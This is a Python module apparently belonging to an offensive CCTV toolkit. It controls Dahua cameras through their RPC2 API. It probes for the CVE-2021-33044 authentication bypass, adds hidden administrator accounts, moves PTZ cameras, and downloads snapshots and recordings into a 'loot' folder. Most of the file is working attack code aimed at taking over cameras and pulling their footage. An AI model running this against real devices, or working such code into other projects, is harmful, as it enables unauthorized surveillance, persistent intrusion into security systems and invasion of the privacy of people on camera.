# language: Python, file: core/cctv/dahua.py
# Dahua HTTP API — full control
import httpx
import hashlib
import os
from datetime import datetime
from typing import Optional


class DahuaAPI:
    """
    Dahua HTTP API — RPC2 protocol.
    Endpoints:
      POST /RPC2_Login — auth
      POST /RPC2 — general RPC calls
    """
    def __init__(self, ip: str, port: int = 80, user: str = "",
                  password: str = ""):
        self.ip = ip
        self.port = port
        self.user = user
        self.password = password
        self.base_url = f"http://{ip}:{port}"
        self.client = httpx.Client(timeout=10, verify=False)
        self.session_id = None

    def login(self) -> dict:
        """
        Dahua login — مع digest negotiation.
        """
        try:
            # first request — get realm, nonce
            r1 = self.client.post(
                f"{self.base_url}/RPC2_Login",
                json={
                    "method": "global.login",
                    "params": {
                        "userName": self.user,
                        "password": "",
                        "clientType": "Web3.0",
                        "loginType": "Direct",
                        "authorityType": "Default",
                        "passwordType": "Plain",
                    },
                    "id": 1,
                })
            if r1.status_code != 200:
                return {"error": f"HTTP {r1.status_code}"}

            data = r1.json()
            if not data.get("result"):
                return {"error": "login rejected"}

            params = data.get("params", {})
            realm = params.get("realm", "")
            nonce = params.get("nonce", "")
            session = params.get("session", "")

            # compute digest
            ha1 = hashlib.md5(
                f"{self.user}:{realm}:{self.password}".encode()
            ).hexdigest()
            ha2 = hashlib.md5(b"global.login").hexdigest()
            response = hashlib.md5(
                f"{ha1}:{nonce}:{ha2}".encode()
            ).hexdigest().upper()

            # second login with digest
            r2 = self.client.post(
                f"{self.base_url}/RPC2_Login",
                json={
                    "method": "global.login",
                    "params": {
                        "userName": self.user,
                        "password": response,
                        "clientType": "Web3.0",
                        "loginType": "Digest",
                        "authorityType": "Default",
                        "passwordType": "Default",
                    },
                    "id": 2,
                    "session": session,
                })
            if r2.status_code == 200 and r2.json().get("result"):
                self.session_id = session
                return {"status": "ok", "session": session}
            return {"error": "digest auth failed"}
        except Exception as e:
            return {"error": str(e)}

    def _rpc(self, method: str, params: dict) -> dict:
        """RPC call generic"""
        try:
            r = self.client.post(
                f"{self.base_url}/RPC2",
                json={
                    "method": method,
                    "params": params,
                    "session": self.session_id,
                    "id": 1,
                })
            return r.json()
        except Exception as e:
            return {"error": str(e)}

    # ==================== device ====================
    def get_device_info(self) -> dict:
        return self._rpc("magicBox.getDeviceType", {})

    def get_software_version(self) -> dict:
        return self._rpc("magicBox.getSoftwareVersion", {})

    def get_serial_number(self) -> dict:
        return self._rpc("magicBox.getSerialNo", {})

    def get_system_info(self) -> dict:
        return self._rpc("magicBox.getSystemInfo", {})

    # ==================== channels ====================
    def list_channels(self) -> list:
        """قنوات الفيديو"""
        result = self._rpc("configManager.getConfig", {
            "name": "ChannelTitle",
        })
        if "params" in result:
            return result["params"].get("table", [])
        return []

    def get_rtsp_url(self, channel: int = 1, subtype: int = 0) -> str:
        """RTSP URL"""
        if self.user:
            return (f"rtsp://{self.user}:{self.password}@{self.ip}:554/"
                    f"cam/realmonitor?channel={channel}&subtype={subtype}")
        return (f"rtsp://{self.ip}:554/cam/realmonitor?"
                f"channel={channel}&subtype={subtype}")

    # ==================== PTZ ====================
    def ptz_move(self, code: str = "Left", arg1: int = 5,
                  arg2: int = 5, arg3: int = 5,
                  channel: int = 1) -> dict:
        """
        تحريك PTZ.
        code: Left/Right/Up/Down/ZoomTele/ZoomWide/FocusNear/FocusFar
        arg1-3: سرعة 1-8
        """
        return self._rpc("ptz.start", {
            "channel": channel,
            "code": code,
            "arg1": arg1,
            "arg2": arg2,
            "arg3": arg3,
        })

    def ptz_stop(self, channel: int = 1) -> dict:
        return self._rpc("ptz.stop", {"channel": channel})

    def ptz_preset_goto(self, preset: int, channel: int = 1) -> dict:
        return self._rpc("ptz.gotoPreset", {
            "channel": channel,
            "index": preset,
        })

    def ptz_set_preset(self, preset: int, name: str = "",
                        channel: int = 1) -> dict:
        return self._rpc("ptz.setPreset", {
            "channel": channel,
            "index": preset,
            "name": name or f"preset_{preset}",
        })

    def ptz_list_presets(self, channel: int = 1) -> list:
        result = self._rpc("ptz.getPresets", {"channel": channel})
        if "params" in result:
            return result["params"].get("presets", [])
        return []

    # ==================== snapshots ====================
    def snapshot(self, channel: int = 1, save_path: str = None) -> dict:
        """
        يأخذ snapshot.
        Dahua endpoints: /cgi-bin/snapshot.cgi?channel=1
        """
        if not save_path:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_ip = self.ip.replace(".", "_")
            save_path = f"loot/cctv_snapshots/dahua_{safe_ip}_{timestamp}.jpg"
            os.makedirs(os.path.dirname(save_path), exist_ok=True)

        try:
            # try standard endpoint
            r = self.client.get(
                f"{self.base_url}/cgi-bin/snapshot.cgi",
                params={"channel": channel},
                auth=(self.user, self.password) if self.user else None)
            if r.status_code == 200 and len(r.content) > 1000:
                with open(save_path, "wb") as f:
                    f.write(r.content)
                return {"success": True, "path": save_path,
                          "size": len(r.content)}
            return {"error": f"HTTP {r.status_code}"}
        except Exception as e:
            return {"error": str(e)}

    # ==================== users ====================
    def list_users(self) -> list:
        result = self._rpc("configManager.getConfig", {
            "name": "Account",
        })
        if "params" in result:
            return result["params"].get("users", [])
        return []

    def add_admin_user(self, username: str, password: str) -> dict:
        """يضيف مستخدم admin"""
        return self._rpc("configManager.setConfig", {
            "name": "Account",
            "table": [{
                "User": username,
                "Password": password,
                "Authority": "admin",
                "Reserved": False,
                "Sharable": True,
                "Group": "admin",
            }],
        })

    # ==================== playback ====================
    def list_recordings(self, channel: int = 1,
                          start: str = None, end: str = None) -> list:
        """
        قائمة تسجيلات. start/end ISO format.
        """
        start = start or "2024-01-01 00:00:00"
        end = end or "2024-12-31 23:59:59"
        return self._rpc("mediaFileFind.factory.find", {
            "condition": {
                "Channel": channel,
                "StartTime": start,
                "EndTime": end,
                "Types": ["dav"],
            },
        })

    def download_recording(self, channel: int, start: str,
                            end: str, save_path: str) -> dict:
        """تنزيل فيديو"""
        try:
            url = (f"{self.base_url}/cgi-bin/playback.cgi?"
                    f"action=download&channel={channel}"
                    f"&starttime={start}&endtime={end}")
            r = self.client.get(
                url, auth=(self.user, self.password) if self.user else None,
                timeout=300)
            if r.status_code == 200 and len(r.content) > 10000:
                with open(save_path, "wb") as f:
                    f.write(r.content)
                return {"success": True, "path": save_path,
                          "size": len(r.content)}
            return {"error": f"HTTP {r.status_code}"}
        except Exception as e:
            return {"error": str(e)}

    # ==================== backdoor check ====================
    def check_cve_2021_33044(self) -> dict:
        """
        CVE-2021-33044 — auth bypass.
        محاولة قراءة users بدون auth.
        """
        try:
            r = self.client.post(
                f"{self.base_url}/RPC2_Login",
                json={
                    "method": "global.login",
                    "params": {
                        "userName": "admin",
                        "password": "",
                        "clientType": "Web3.0",
                        "loginType": "Direct",
                        "authorityType": "Default",
                        "passwordType": "Plain",
                    },
                    "id": 1,
                })
            data = r.json()
            if data.get("result"):
                return {"vulnerable": True, "bypass_worked": True}
        except Exception as e:
            return {"error": str(e)}
        return {"vulnerable": False}
